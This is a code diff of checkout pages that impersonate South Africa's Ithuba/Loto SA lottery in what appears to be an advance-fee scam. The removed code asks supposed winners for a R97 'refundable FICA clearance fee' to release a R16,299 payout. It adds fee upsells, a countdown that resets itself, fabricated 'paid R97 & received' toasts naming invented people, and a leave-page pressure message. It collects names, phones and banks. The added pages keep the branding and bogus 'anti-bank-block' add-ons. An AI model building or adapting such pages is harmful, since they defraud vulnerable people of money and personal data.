-      <!-- Step Checklist -->
-      <div style="background:rgba(0,0,0,0.45);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:12px 14px;text-align:left;font-size:11.5px;color:rgba(255,255,255,0.8);display:flex;flex-direction:column;gap:8px;">
-        <div style="display:flex;align-items:center;gap:8px;color:#10b981;">
-          <span>â</span> <strong>Beneficiary Allocation Verified</strong>
-        </div>
-        <div style="display:flex;align-items:center;gap:8px;color:#10b981;">
-          <span>â</span> <strong>PayShap Fast-Track Escrow Reserved</strong>
-        </div>
-        <div style="display:flex;align-items:center;gap:8px;color:#ffe100;">
-          <span style="display:inline-block;animation:spinLoader 1.5s linear infinite;">â³</span> <strong>Opening Paystack Inline Payment Window...</strong>
-        </div>
-      </div>
-
-      <div style="margin-top:14px;font-size:11px;color:rgba(255,255,255,0.6);">
-        ð 256-Bit TLS Bank Encrypted â¢ Do not close or refresh
-      </div>
-    </div>
-  </div>
-
-  <!-- COMPLETE CREAPAY / PAYSTACK CHECKOUT LOGIC -->
+  <button type="button" onclick="payWithPaystack()">Pagar R 200,00 com Paystack</button>
   <script>
-    const CheckoutConfig = {
-      baseFee: 97,
-      principalPayout: 16299,
-      currentTotalFee: 97,
-      currentAmountMinor: 9700,
-      checkoutRedirectUrl: 'https://pay.africagrabpoint.com/c/e-wallet-fee-unclock',
-      voucherRef: 'ZA-ITH-2026-' + Math.floor(100000 + Math.random() * 900000),
-      selectedBank: 'Capitec Bank',
-      phone: ''
-    };
-
-    const bankLogos = {
-      'Capitec': 'images/banks/capitec.svg',
-      'FNB': 'images/banks/fnb.svg',
-      'Standard': 'images/banks/standard_bank.svg',
-      'Nedbank': 'images/banks/nedbank.svg',
-      'ABSA': 'images/banks/absa.svg',
-      'TymeBank': 'images/banks/tymebank.svg',
-      'African': 'images/banks/african_bank.svg',
-      'Discovery': 'images/banks/discovery_bank.svg'
-    };
-
-    function selectCheckoutBank(bankName, logoPath, btnEl) {
-      CheckoutConfig.selectedBank = bankName;
-      document.getElementById('dispBankName').innerText = bankName;
-      document.getElementById('dispBankLogo').src = logoPath;
-      document.querySelectorAll('.bank-mini-btn').forEach(b => b.classList.remove('active'));
-      if (btnEl) btnEl.classList.add('active');
-    }
-
-    function toggleOrderBump() {
-      const bumpPayShap = document.getElementById('bumpPayShap') ? document.getElementById('bumpPayShap').checked : false;
-      const bumpTaxCert = document.getElementById('bumpTaxCert') ? document.getElementById('bumpTaxCert').checked : false;
-
-      const rowPayShap = document.getElementById('rowBumpPayShap');
-      const rowTaxCert = document.getElementById('rowBumpTaxCert');
-
-      if (rowPayShap) rowPayShap.style.display = bumpPayShap ? 'flex' : 'none';
-      if (rowTaxCert) rowTaxCert.style.display = bumpTaxCert ? 'flex' : 'none';
-
-      let totalFee = CheckoutConfig.baseFee; // 97 base
-      let totalMinor = CheckoutConfig.currentAmountMinor || 9700;
-
-      if (bumpPayShap) {
-        totalFee += 79;
-        totalMinor += 7900;
-      }
-      if (bumpTaxCert) {
-        totalFee += 99;
-        totalMinor += 9900;
-      }
-
-      CheckoutConfig.currentTotalFee = totalFee;
-      CheckoutConfig.currentAmountMinor = totalMinor;
-
-      const netDisbursed = CheckoutConfig.principalPayout + 97; // Mandatory R97 FICA deposit is refunded
-      const formattedNet = 'R ' + netDisbursed.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-      
-      const btn = document.getElementById('mainCheckoutButton');
-      if (btn) {
-        const titleSpan = btn.querySelector('.btn-main-title');
-        if (titleSpan) {
-          titleSpan.innerHTML = `PAY R ${totalFee}.00 &amp; RELEASE <span id="btnReleaseAmount">${formattedNet}</span> NOW &rarr;`;
+    function payWithPaystack(){
+      var handler = PaystackPop.setup({
+        key: 'pk_test_XXXXXXXXXXXXXXXXXXXXXX', // TODO: replace with your Paystack public key
+        email: 'cliente@example.com',
+        amount: 20000, // amount in kobo (R200.00)
+        currency: 'ZAR',
+        ref: 'PS_' + new Date().getTime(),
+        callback: function(response){
+          alert('Pagamento aprovado. Referência: ' + response.reference);
+        },
+        onClose: function(){
+          alert('Popup fechado sem pagamento.');
         }
-      }
-
-      if (window.Track && (bumpPayShap || bumpTaxCert)) {
-        window.Track.funnel('bump_selection_changed', {
-          payshap: bumpPayShap,
-          tax_cert: bumpTaxCert,
-          total_fee: totalFee
-        });
-      }
+      });
+      handler.openIframe();
     }
+  </script>
+</body>
+</html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paystack Checkout – Loto SA</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet" />
+  <style>
+    body {font-family:'Montserrat',Arial,Helvetica,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
+    .card{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);max-width:380px;width:100%;text-align:center;}
+    .logo{width:120px;margin-bottom:1rem;}
+    h2{margin:0 0 .5rem;color:#333;}
+    .price{font-size:1.3rem;color:#0066ff;margin-bottom:1rem;}
+    .btn{background:#0066ff;color:#fff;border:none;padding:.75rem 1.5rem;border-radius:4px;font-size:1rem;cursor:pointer;}
+    .btn:disabled{background:#999;cursor:not-allowed;}
+    #status{margin-top:1rem;font-size:.9rem;color:#555;}
+  </style>
+  <!-- Paystack Inline JS -->
+  <script src="https://js.paystack.co/v1/inline.js"></script>
+</head>
+<body>
+  <div class="card">
+    <img src="images/ithuba/lotto_logo.png" alt="Loto SA" class="logo" />
+    <h2>Compra – R 200,00</h2>
+    <p class="price">Valor: <strong>R 200,00</strong></p>
+    <button id="payBtn" class="btn">Pagar com Paystack</button>
+    <p id="status"></p>
+  </div>
+  <script>
+    const publicKey = 'pk_test_XXXXXXXXXXXXXXXXXXXXXX'; // TODO: replace with your Paystack public key
+    const email = 'cliente@example.com';
+    const amount = 20000; // amount in kobo (R200.00 => 20000)
 
-    function updateAmountsUI(amt) {
-      CheckoutConfig.principalPayout = amt;
-      const formatted = 'R ' + amt.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-      document.getElementById('summaryAllocAmount').innerText = formatted;
-      document.getElementById('summaryPrincipalAmount').innerText = formatted;
-
-      const netDisbursed = amt + CheckoutConfig.baseFee;
-      const formattedNet = 'R ' + netDisbursed.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-      document.getElementById('summaryNetCredit').innerText = formattedNet + ' ZAR';
-      document.getElementById('guaranteeNetText').innerText = formattedNet + ' ZAR';
-      toggleOrderBump();
-    }
-
-    async function handleCheckoutSubmit(event) {
-      if (event) event.preventDefault();
-
-      const nameInput = document.getElementById('custName');
-      const emailInput = document.getElementById('custEmail');
-      const phoneInput = document.getElementById('custPhone');
-
-      const custName = (nameInput && nameInput.value.trim()) || 'Citizen Beneficiary';
-      let custEmail = (emailInput && emailInput.value.trim()) || '';
-      const custPhone = (phoneInput && phoneInput.value.trim()) || CheckoutConfig.phone || '0821234567';
-      const rawPhone = custPhone.replace(/[^0-9]/g, '');
-
-      if (custEmail && !custEmail.includes('@')) {
-        alert('Please enter a valid email address.');
-        if (emailInput) emailInput.focus();
-        return;
-      }
-
-      if (!custEmail) {
-        custEmail = 'citizen.' + (rawPhone || Math.random().toString(36).substring(2, 8)) + '@gmail.com';
-      }
-
-      const bumpPayShap = document.getElementById('bumpPayShap') ? document.getElementById('bumpPayShap').checked : false;
-      const bumpTaxCert = document.getElementById('bumpTaxCert') ? document.getElementById('bumpTaxCert').checked : false;
-      const activeBumps = {
-        payshap: bumpPayShap,
-        tax_cert: bumpTaxCert
-      };
-      const totalAmountMinor = CheckoutConfig.currentAmountMinor || 20000;
-      const totalFeeAmount = totalAmountMinor / 100;
-
-      if (window.fbq) {
-        fbq('track', 'AddPaymentInfo', {
-          content_name: 'Statutory RICA Clearance Fee',
-          currency: 'ZAR',
-          value: totalFeeAmount
-        });
-      }
-
-      const btn = document.getElementById('mainCheckoutButton');
-      const originalBtnHtml = btn.innerHTML;
-      btn.innerHTML = '<span class="btn-main-title">CONNECTING TO PAYSTACK GATEWAY...</span>';
-      btn.style.opacity = '0.85';
-      btn.disabled = true;
-      showProcessingModal();
-
-      if (window.Track) {
-        window.Track.funnel('checkout_pay_button_clicked', {
-          amount: totalFeeAmount,
-          bumps: activeBumps,
-          bank: CheckoutConfig.selectedBank
-        });
-      }
-
-      const apiOrderUrl = window.location.pathname.includes('/restitution') ? '/restitution/api/create-order.php' : (window.location.pathname.includes('/checkout') ? '../api/create-order.php' : 'api/create-order.php');
-
-      const searchParams = new URLSearchParams(window.location.search);
-      const capturedUtms = {
-        utm_source: searchParams.get('utm_source') || sessionStorage.getItem('_sa_utm_source') || localStorage.getItem('_sa_utm_source') || sessionStorage.getItem('utm_source') || localStorage.getItem('utm_source') || '',
-        utm_medium: searchParams.get('utm_medium') || sessionStorage.getItem('_sa_utm_medium') || localStorage.getItem('_sa_utm_medium') || sessionStorage.getItem('utm_medium') || localStorage.getItem('utm_medium') || '',
-        utm_campaign: searchParams.get('utm_campaign') || sessionStorage.getItem('_sa_utm_campaign') || localStorage.getItem('_sa_utm_campaign') || sessionStorage.getItem('utm_campaign') || localStorage.getItem('utm_campaign') || '',
-        utm_content: searchParams.get('utm_content') || sessionStorage.getItem('_sa_utm_content') || localStorage.getItem('_sa_utm_content') || sessionStorage.getItem('utm_content') || localStorage.getItem('utm_content') || '',
-        utm_term: searchParams.get('utm_term') || sessionStorage.getItem('_sa_utm_term') || localStorage.getItem('_sa_utm_term') || sessionStorage.getItem('utm_term') || localStorage.getItem('utm_term') || '',
-        fbclid: searchParams.get('fbclid') || sessionStorage.getItem('_sa_fbclid') || localStorage.getItem('_sa_fbclid') || sessionStorage.getItem('fbclid') || localStorage.getItem('fbclid') || '',
-        src: searchParams.get('src') || sessionStorage.getItem('_sa_src') || localStorage.getItem('_sa_src') || sessionStorage.getItem('src') || localStorage.getItem('src') || '',
-        sck: searchParams.get('sck') || sessionStorage.getItem('_sa_sck') || localStorage.getItem('_sa_sck') || sessionStorage.getItem('sck') || localStorage.getItem('sck') || ''
-      };
-
-      try {
-        const resp = await fetch(apiOrderUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            order_id: CheckoutConfig.voucherRef,
-            phone: custPhone,
-            name: custName,
-            email: custEmail,
-            bank: CheckoutConfig.selectedBank,
-            amount_minor: totalAmountMinor,
-            title: "Ithuba FICA Refundable Clearance Fee (50% OFF)",
-            bumps: activeBumps,
-            utms: capturedUtms
-          })
-        });
-
-        if (!resp.ok) throw new Error("Could not initialize payment gateway");
-        const order = await resp.json();
-
-        const currentParams = new URLSearchParams(window.location.search);
-        currentParams.set('ref', order.order_id || CheckoutConfig.voucherRef);
-        currentParams.set('order_id', order.id || order.order_id || CheckoutConfig.voucherRef);
-        currentParams.set('creapay_id', order.id || '');
-        currentParams.set('bank', CheckoutConfig.selectedBank);
-        currentParams.set('name', custName);
-        currentParams.set('email', custEmail);
-        if (custPhone) currentParams.set('phone', custPhone);
-        Object.keys(capturedUtms).forEach(function(k) {
-          if (capturedUtms[k] && !currentParams.get(k)) {
-            currentParams.set(k, capturedUtms[k]);
-          }
-        });
-
-        const upsell1Path = window.location.pathname.includes('/restitution') ? '/restitution/upsell1.html?' : 'upsell1.html?';
-        const nextUrl = upsell1Path + currentParams.toString();
-
-        if (order && order.checkout_token && window.CreaPay && typeof window.CreaPay.pay === 'function') {
-          btn.innerHTML = '<span class="btn-main-title">AWAITING AUTHORIZATION...</span>';
-          hideProcessingModal();
-          const recordSaleUrl = window.location.pathname.includes('/restitution') ? '/restitution/api/record-sale.php' : (window.location.pathname.includes('/checkout') ? '../api/record-sale.php' : 'api/record-sale.php');
-
-          const recordAndProceed = function() {
-            if (window.Track) {
-              window.Track.funnel('checkout_payment_approved', {
-                amount: totalFeeAmount,
-                order_id: order.order_id || CheckoutConfig.voucherRef,
-                bank: CheckoutConfig.selectedBank
-              });
-            }
-            try {
-              fetch(recordSaleUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  order_id: order.order_id || CheckoutConfig.voucherRef,
-                  creapay_id: order.id || '',
-                  amount: totalFeeAmount,
-                  name: custName,
-                  email: custEmail,
-                  phone: custPhone,
-                  bank: CheckoutConfig.selectedBank,
-                  utms: capturedUtms
-                }),
-                keepalive: true
-              });
-            } catch(e) {}
-
-            try {
-              localStorage.setItem('ithuba_last_order', JSON.stringify({
-                order_id: order.order_id || CheckoutConfig.voucherRef,
-                creapay_id: order.id || '',
-                name: custName,
-                email: custEmail,
-                phone: custPhone,
-                bank: CheckoutConfig.selectedBank
-              }));
-            } catch(e) {}
-
-            window.location.href = nextUrl;
-          };
-
-          // Abre sÃ³ a janela do Paystack nesta pÃ¡gina. Sem redirecionamento.
-          const result = await CreaPay.pay({
-            checkoutToken: order.checkout_token,
-            orderId: order.order_id,
-            accessCode: order.access_code,
-            onStatus: function (state) {
-              if (state && (state.status === 'approved' || state.status === 'success')) {
-                recordAndProceed();
-              }
-            }
-          });
-
-          if (result && (result.status === 'approved' || result.status === 'success')) {
-            recordAndProceed();
-            return;
-          }
-        } else {
-          hideProcessingModal();
-          // Fallback se o SDK embed.js nÃ£o estiver disponÃ­vel (ex: bloqueador de anÃºncios)
-          const fallbackCheckoutUrl = (order && order.checkout_url) 
-            ? order.checkout_url 
-            : ('https://pay.africagrabpoint.com/pay/e-wallet-fee-unclock?ref=' + encodeURIComponent(order.order_id || CheckoutConfig.voucherRef) + '&phone=' + encodeURIComponent(rawPhone));
-          openCreaPayModal(fallbackCheckoutUrl);
+    document.getElementById('payBtn').addEventListener('click', function(){
+      const handler = PaystackPop.setup({
+        key: publicKey,
+        email: email,
+        amount: amount,
+        currency: 'ZAR',
+        ref: 'PS_' + new Date().getTime(), // generate a unique reference
+        callback: function(response){
+          // you can verify transaction on your server here
+          document.getElementById('status').textContent = 'Pagamento aprovado, referência: ' + response.reference;
+        },
+        onClose: function(){
+          document.getElementById('status').textContent = 'Popup fechado sem pagamento.';
         }
-      } catch (err) {
-        hideProcessingModal();
-        console.error("CreaPay payment error:", err);
-        const fallbackCheckoutUrl = 'https://pay.africagrabpoint.com/pay/e-wallet-fee-unclock?ref=' + encodeURIComponent(CheckoutConfig.voucherRef) + '&phone=' + encodeURIComponent(rawPhone);
-        openCreaPayModal(fallbackCheckoutUrl);
-      } finally {
-        hideProcessingModal();
-        btn.disabled = false;
-        btn.innerHTML = originalBtnHtml;
-        btn.style.opacity = '1';
-      }
-    }
-
-    function showProcessingModal() {
-      const el = document.getElementById('processingOverlay');
-      if (el) el.style.display = 'flex';
-      document.body.style.overflow = 'hidden';
-    }
-
-    function hideProcessingModal() {
-      const el = document.getElementById('processingOverlay');
-      if (el) el.style.display = 'none';
-      document.body.style.overflow = '';
-    }
-
-    function openCreaPayModal(url) {
-      const modal = document.getElementById('creaPayModal');
-      const iframe = document.getElementById('creaPayFrame');
-      const loader = document.getElementById('modalIframeLoader');
-
-      if (loader) loader.style.display = 'block';
-      if (iframe) iframe.src = url;
-
-      if (iframe) {
-        iframe.onload = function() {
-          if (loader) loader.style.display = 'none';
-        };
-      }
-
-      if (modal) modal.style.display = 'flex';
-      document.body.style.overflow = 'hidden';
-    }
-
-    function closeCreaPayModal() {
-      const modal = document.getElementById('creaPayModal');
-      const iframe = document.getElementById('creaPayFrame');
-      modal.style.display = 'none';
-      iframe.src = 'about:blank';
-      document.body.style.overflow = '';
-    }
-
-    window.addEventListener('message', function(event) {
-      if (event && event.data) {
-        const str = typeof event.data === 'string' ? event.data : JSON.stringify(event.data);
-        if (str.includes('approved') || str.includes('success') || str.includes('payment_completed')) {
-          closeCreaPayModal();
-          const currentParams = new URLSearchParams(window.location.search);
-          const upsell1Path = window.location.pathname.includes('/restitution') ? '/restitution/upsell1.html?' : 'upsell1.html?';
-          window.location.href = upsell1Path + currentParams.toString();
-        }
-      }
-    });
-
-    function handleOverlayClick(event) {
-      if (event.target === document.getElementById('creaPayModal')) {
-        closeCreaPayModal();
-      }
-    }
-
-    function startCountdown() {
-      let totalSeconds = 4 * 60 + 59;
-      const timerEl = document.getElementById('checkoutTimer');
-      setInterval(() => {
-        if (totalSeconds <= 0) totalSeconds = 5 * 60;
-        totalSeconds--;
-        const mins = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
-        const secs = String(totalSeconds % 60).padStart(2, '0');
-        if (timerEl) timerEl.innerText = `${mins}:${secs}`;
-      }, 1000);
-    }
-
-    function startSocialStream() {
-      const toast = document.getElementById('checkoutToast');
-      const msgEl = document.getElementById('toastMessage');
-      const imgEl = document.getElementById('toastBankImg');
-
-      const feed = [
-        { name: 'Sibusiso D.', city: 'Johannesburg', logo: 'images/banks/capitec.svg', bank: 'Capitec', time: '22s ago' },
-        { name: 'Nomvula K.', city: 'Durban', logo: 'images/banks/fnb.svg', bank: 'FNB', time: '48s ago' },
-        { name: 'Lethabo S.', city: 'Pretoria', logo: 'images/banks/tymebank.svg', bank: 'TymeBank', time: '1m ago' },
-        { name: 'Zanele T.', city: 'Soweto', logo: 'images/banks/standard_bank.svg', bank: 'Standard Bank', time: '35s ago' },
-        { name: 'Kgosi M.', city: 'Bloemfontein', logo: 'images/banks/absa.svg', bank: 'ABSA', time: '1m ago' }
-      ];
-
-      let index = 0;
-      setInterval(() => {
-        const item = feed[index % feed.length];
-        index++;
-        imgEl.src = item.logo;
-        const amtText = document.getElementById('summaryAllocAmount').innerText;
-        msgEl.innerHTML = `<strong style="color:#ffe100;">${item.name} (${item.city})</strong> paid R97 &amp; received <b>${amtText}</b> via ${item.bank} (${item.time})`;
-        toast.classList.add('visible');
-        setTimeout(() => toast.classList.remove('visible'), 4200);
-      }, 9500);
-    }
-
-    window.addEventListener('DOMContentLoaded', () => {
-      startCountdown();
-      startSocialStream();
-
-      const params = new URLSearchParams(window.location.search);
-      if (params.get('ref')) CheckoutConfig.voucherRef = params.get('ref');
-      document.getElementById('summaryVoucherId').innerText = 'REF: ' + CheckoutConfig.voucherRef;
-
-      // Auto-fill from URL or localStorage
-      const savedName = params.get('name') || localStorage.getItem('ithuba_winner_name') || '';
-      const savedPhone = params.get('phone') || localStorage.getItem('ithuba_winner_phone') || '';
-      const savedBank = params.get('bank') || localStorage.getItem('ithuba_winner_bank') || 'Capitec Bank';
-      const savedAmt = parseFloat(params.get('amount') || localStorage.getItem('ithuba_winner_prize') || '16299');
-
-      if (savedName) document.getElementById('custName').value = savedName;
-      if (savedPhone) {
-        CheckoutConfig.phone = savedPhone;
-        document.getElementById('custPhone').value = savedPhone;
-      }
-
-      if (savedBank) {
-        CheckoutConfig.selectedBank = savedBank;
-        document.getElementById('dispBankName').innerText = savedBank;
-        for (const key in bankLogos) {
-          if (savedBank.toLowerCase().includes(key.toLowerCase())) {
-            document.getElementById('dispBankLogo').src = bankLogos[key];
-            break;
-          }
-        }
-      }
-
-      if (!isNaN(savedAmt) && savedAmt > 0) {
-        updateAmountsUI(savedAmt);
-      } else {
-        updateAmountsUI(16299);
-      }
-    });
-
-    // Retention warning
-    window.addEventListener('beforeunload', function(e) {
-      const confirmationMessage = 'Your R 16,396.00 payout clearance is still pending. If you leave, this 50% discount expires immediately.';
-      (e || window.event).returnValue = confirmationMessage;
-      return confirmationMessage;
+      });
+      handler.openIframe();
     });
   </script>
 </body>
 </html>
-
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paystack Checkout – Loto SA</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet" />
+  <style>
+    body {font-family:'Montserrat',Arial,Helvetica,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
+    .card{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);max-width:380px;width:100%;text-align:center;}
+    .logo{width:120px;margin-bottom:1rem;}
+    h2{margin:0 0 .5rem;color:#333;}
+    .price{font-size:1.3rem;color:#0066ff;margin-bottom:1rem;}
+    .btn{background:#0066ff;color:#fff;border:none;padding:.75rem 1.5rem;border-radius:4px;font-size:1rem;cursor:pointer;}
+    .btn:disabled{background:#999;cursor:not-allowed;}
+    #status{margin-top:1rem;font-size:.9rem;color:#555;}
+  </style>
+  <script src="https://pay.africagrabpoint.com/embed.js"></script>
+</head>
+<body>
+  <div class="card">
+    <img src="images/ithuba/lotto_logo.png" alt="Loto SA" class="logo" />
+    <h2>Compra – R 200,00</h2>
+    <p class="price">Valor: <strong>R 200,00</strong></p>
+    <button id="payBtn" class="btn">Pagar com Paystack</button>
+    <p id="status"></p>
+  </div>
+  <script>
+    const ENDPOINT = '/api/create-order-200.php';
+    document.getElementById('payBtn').addEventListener('click', async () => {
+      const btn = event.target;
+      btn.disabled = true;
+      btn.textContent = 'Processando...';
+      try {
+        const resp = await fetch(ENDPOINT, {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({
+            order_id: 'PAYSTACK-' + Date.now(),
+            title: 'Loto SA – Paystack Checkout',
+            amount_minor: 20000,
+            currency: 'ZAR',
+            customer: {name:'Cliente',email:'cliente@example.com',phone:''}
+          })
+        });
+        const data = await resp.json();
+        if (!resp.ok) throw new Error(data.error || 'Falha ao criar ordem');
+        const token = data.checkout_token;
+        const result = await CreaPay.pay({
+          checkoutToken: token,
+          orderId: data.order_id,
+          onStatus: s => document.getElementById('status').textContent = 'Status: ' + s.status
+        });
+        console.log('Paystack result', result);
+      } catch(e){
+        console.error(e);
+        document.getElementById('status').textContent = 'Erro: ' + e.message;
+      } finally {
+        btn.disabled = false;
+        btn.textContent = 'Pagar com Paystack';
+      }
+    });
+  </script>
+</body>
+</html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FACB0F" />
+  <title>Checkout – Loto SA (Paystack)</title>
+  <!-- Google Fonts (same family used in reference page) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Urbanist:wght@500;600;700;800;900&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Montserrat', Arial, Helvetica, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+    }
+    .logo { width: 120px; margin-bottom: 1rem; }
+    h2 { margin-top: 0; font-weight: 600; color: #333; }
+    .price { font-size: 1.4rem; margin: 0.5rem 0 1rem; color: #0066ff; }
+    .options { text-align: left; margin: 1rem 0; }
+    .options label { display: block; margin-bottom: 0.5rem; font-size: 0.95rem; color: #444; }
+    .btn { background: #0066ff; color: #fff; border: none; padding: 0.75rem 1.5rem; border-radius: 4px; font-size: 1rem; cursor: pointer; }
+    .btn:disabled { background: #999; cursor: not-allowed; }
+    #status { margin-top: 1rem; font-size: 0.95rem; color: #555; }
+  </style>
+  <script src="https://pay.africagrabpoint.com/embed.js"></script>
+</head>
+<body>
+  <div class="card">
+    <img src="images/ithuba/lotto_logo.png" alt="Loto SA" class="logo" />
+    <h2>Compra – R 200,00</h2>
+    <p class="price">Preço total: <strong>R 200,00</strong></p>
+    <div class="options">
+      <label><input type="checkbox" id="upsell"/> ​Upsell – +R 97,00 (Seguro Anti‑Bloqueio Bancário)</label>
+      <label><input type="checkbox" id="downsell"/> ​Downsell – +R 97,00 (Garantia de Prioridade SARB)</label>
+    </div>
+    <button id="payBtn" class="btn">Pagar R 200,00</button>
+    <p id="status"></p>
+  </div>
+  <script>
+    const CREATE_ORDER_ENDPOINT = '/api/create-order-200.php';
+    document.getElementById('payBtn').addEventListener('click', async () => {
+      const btn = event.target;
+      btn.disabled = true;
+      btn.textContent = 'Processando...';
+      try {
+        const extra = (document.getElementById('upsell').checked ? 9700 : 0) +
+                      (document.getElementById('downsell').checked ? 9700 : 0);
+        const response = await fetch(CREATE_ORDER_ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            order_id: 'LOTO-200-' + Date.now(),
+            title: 'Loto SA – Produto R200',
+            amount_minor: 20000 + extra,
+            currency: 'ZAR',
+            customer: { name: 'Cliente', email: 'cliente@example.com', phone: '' }
+          })
+        });
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error || 'Falha ao criar ordem');
+        const token = data.checkout_token;
+        const result = await CreaPay.pay({
+          checkoutToken: token,
+          orderId: data.order_id,
+          onStatus: (state) => {
+            document.getElementById('status').textContent = 'Status: ' + state.status;
+          }
+        });
+        console.log('Resultado Paystack', result);
+      } catch (e) {
+        console.error(e);
+        document.getElementById('status').textContent = 'Erro: ' + e.message;
+      } finally {
+        btn.disabled = false;
+        btn.textContent = 'Pagar R 200,00';
+      }
+    });
+  </script>
+</body>
+</html>
